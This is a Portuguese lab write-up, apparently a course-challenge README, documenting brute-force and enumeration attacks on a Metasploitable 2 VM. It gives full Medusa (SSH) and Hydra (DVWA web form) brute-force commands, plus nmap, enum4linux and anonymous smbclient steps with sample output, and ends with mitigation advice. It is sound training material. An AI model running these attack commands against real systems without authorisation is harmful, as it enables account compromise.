# Lab de Brute Force: Kali Linux & Metasploitable 2
Repositorio apenas para documentar um desafio feito pela plataforma DIO sobre ataques utilizando metasploitables 2 e DWA 

Aviso Legal: Este laboratório foi desenvolvido estritamente para fins educacionais e de pesquisa em segurança da informação,os comandos a seguir não foram utilizados em nenhuma máquina real apenas em ambiente controlado.

# 1. Objetivo do Laboratório
Demonstrar o funcionamento de um ataque de Força Bruta automatizado contra um serviço de rede (SSH) utilizando a ferramenta Medusa, evidenciando os riscos de credenciais fracas ou padrão e a importância de políticas de senhas fortes.

#2. Arquitetura e Requisitos do Ambiente
Para montar este laboratório, foi necessário utilizar as seguintes ferramentas:
•	Máquina Atacante: Kali Linux
•	Máquina Alvo: Metasploitable 2 (Máquina virtual intencionalmente vulnerável)
•	Ferramenta Utilizada: Medusa (já inclusa por padrão no Kali Linux)

# 3. Reconhecimento (Fase de Reconhecimento)
Antes de iniciar o ataque, precisamos identificar o endereço IP da máquina alvo na rede local e confirmar se o serviço SSH está ativo.

#3.1. Identificando o IP do alvo
Para identificar o IP do alvo, execute o netdiscover ou nmap para encontrar o Metasploitable 2 na rede:

Bash
sudo nmap -sn 192.168.56.0/24
3.2. Escaneamento de Portas
Confirme se a porta do SSH (22) está aberta no alvo:
$ nmap -p 22 -sV 192.168.56.101
Starting Nmap 7.94 ( https://nmap.org ) at 2026-10-29 22:00 EST
Nmap scan report for 192.168.56.101
Host is up (0.00045s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.28 seconds

# 4. Executando o Brute Force com o Medusa
O Medusa é uma ferramenta de força bruta modular e rápida. No Metasploitable 2, as credenciais padrão conhecidas para o usuário administrador são msfadmin / msfadmin.

# 4.1. Preparando as Wordlists
Execute o seguinte comando no terminal do Kali Linux:
$ medusa -h 192.168.56.101 -u msfadmin -P /usr/share/wordlists/passwords.txt -M ssh -t 10

# 5. Detalhamento dos parâmetros:
•	-h: Especifica o endereço IP da máquina alvo.

•	-u: Define um nome de usuário específico a ser testado (msfadmin).

•	-P: Caminho para a wordlist de senhas (ex: rockyou.txt).

•	-M: Define o módulo/serviço a ser atacado (ssh).

•	-t: Define o número de threads paralelas (aumenta a velocidade do processo).

# 6. Resultado Esperado
Se o ataque for bem-sucedido, o Medusa exibirá as credenciais encontradas no terminal:
ACCOUNT FOUND: [ssh] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
ACCOUNT KEPT OPEN: [ssh] Host: 192.168.56.101 User: msfadmin
Medusa finished at Thu Oct 29 22:02:15 2026

Summary of results:
  Target Success Count: 1
  Total Host/User/Password Combinations Tested: 14

# 7. Validação do acesso via SSH

$ ssh msfadmin@192.168.56.101
msfadmin@192.168.56.101's password: 

Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

msfadmin@metasploitable:~$ id
uid=1000(msfadmin) gid=1000(msfadmin) groups=1000(msfadmin),4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),108(lpadmin),109(admin),115(sambashare)
msfadmin@metasploitable:~$ hostname
metasploitable

# 8. Ataque e Enumeração via SMB
O protocolo SMB no Metasploitable 2 possui versões antigas e compartilhamentos abertos que permitem enumeração e até execução de comandos (como a famosa vulnerabilidade do Samba usermap script).

# 8.1. Enumeração de Usuários e Compartilhamentos
Podemos usar o enum4linux ou o nmap para descobrir informações sobre o sistema via SMB:

Shell
$ enum4linux -U 192.168.56.101

Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Oct 29 22:10:00 2026

[+] Metasploitable 2 SMB Enumeration

[+] Getting domain/workgroup info
[+] Connecting to 192.168.56.101:445
[+] Server: metasploitable
[+] Workgroup: WORKGROUP

[+] Enumerating users via SID S-1-5-21-3843521340-2720235316-3023246327
[+] Found users:
    [+] metasploitable\administrator (User ID: 500)
    [+] metasploitable\guest (User ID: 501)
    [+] metasploitable\msfadmin (User ID: 1000)
    [+] metasploitable\service (User ID: 1001)

[+] Enumerating share names
    [+] tmp          (IPC/Disk) - Anonymous write access!
    [+] opt          (Disk)
    [+] ADMIN$       (IPC) - IPC Service
    
8.2. Conexão Anônima ao Compartilhamento (smbclient)
O compartilhamento tmp permite acesso anônimo, o que pode expor arquivos sensíveis:

Shell
$ smbclient //192.168.56.101/tmp
Password for [WORKGROUP\root]: 
Try "help" to get a list of supported commands.
smb: \> ls
  .                                   D        0  Thu Oct 29 20:00:00 2026
  ..                                  D        0  Thu Oct 29 19:50:00 2026
  fsm-config.cache                    R      342  Thu Oct 29 19:55:00 2026

smb: \> exit
# 9. Ataque de Força Bruta Web no DVWA
O Metasploitable 2 hospeda aplicações vulneráveis na porta 80, incluindo o DVWA (Damn Vulnerable Web Application). Um cenário muito comum é realizar força bruta no painel de login web (que possui nível de segurança configurado como Low).

# 9.1. Descoberta do Serviço Web
Verificação rápida com o curl ou nmap da página de login do DVWA:

Shell
$ curl -I http://192.168.56.101/dvwa/login.php
HTTP/1.1 200 OK
Date: Thu, 29 Oct 2026 22:15:00 GMT
Server: Apache/2.2.8 (Ubuntu) DAV/2 SVN/1.4.6 mod_fastcgi/mod_auth_passthrough/2.3.1 PHP/5.2.5-3ubuntu6
X-Powered-By: PHP/5.2.5-3ubuntu6
Content-Type: text/html

# 9.2. Execução de Brute Force Web com o Hydra
O Hydra é excelente para atacar formulários web baseados em métodos POST. O login padrão do DVWA é admin / password.

Shell
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.101 http-post-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Invalid username and/or password" -t 4
🔍 Detalhamento dos parâmetros:
-l admin: Define o usuário alvo como admin.

-P: Caminho para a wordlist de senhas.

http-post-form: Módulo do Hydra para formulários web via POST.

"...": String de configuração contendo o caminho da página, os campos de parâmetro (^USER^ e ^PASS^) e a assinatura de erro (H=...) que o site retorna em caso de falha.

# 9.3. Resultado Esperado do Hydra no DVWA
Shell
Hydra v9.5 (c) 2023 by van Hauser/THC - Please do not use against target without permission, or be PKun

[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344 passwords (one per guess), ~3586/t task, 0 retires
[DATA] attacking http-post-form://192.168.56.101:80/dvwa/vulnerabilities/brute/
[STATUS] 1234/14344 tries - 12 req/sec - 0s real
[192.168.56.101][http-post-form] host: 192.168.56.101   login: admin   password: password
[DATA] 1 valid password found
Hydra finished at Thu Oct 29 22:17:30 2026


# 10. Mitigação e Boas Práticas
Ataques de força bruta exploram a fragilidade humana e a falta de controles de acesso adequados. Para proteger sistemas contra esse tipo de ameaça, recomenda-se:
1.	Políticas de Senhas Fortes: Exigir senhas complexas (mínimo de 12 caracteres, incluindo letras maiúsculas, minúsculas, números e símbolos).
2.	Bloqueio de Conta (Account Lockout): Configurar políticas para bloquear contas após um número específico de tentativas consecutivas falhas.
3.	Autenticação de Dois Fatores (2FA): Implementar 2FA/MFA para impedir o acesso mesmo que a senha seja comprometida.
4.	Ferramentas de Proteção de Perímetro: Utilizar softwares como Fail2ban para banir automaticamente IPs que realizem muitas tentativas de login inválidas em um curto período.
5.	Alterar Portas Padrão: Embora seja apenas segurança por obscuridade, alterar a porta padrão do SSH (ex: de 22 para outra porta) reduz o volume de varreduras automatizadas de bots na internet.
6.	Desativar versões antigas do protocolo (como SMBv1).
7. Desabilitar acessos anônimos (guest ou null sessions).
8. Aplicar patches de atualização do sistema operacional.
9. Implementar Rate Limiting (limitação de taxa de requisições por IP).
10. Adicionar CAPTCHA em formulários de autenticação para bloquear robôs automatizados.
11. Utilizar Web Application Firewalls (WAF) para filtrar padrões de ataques automatizados.

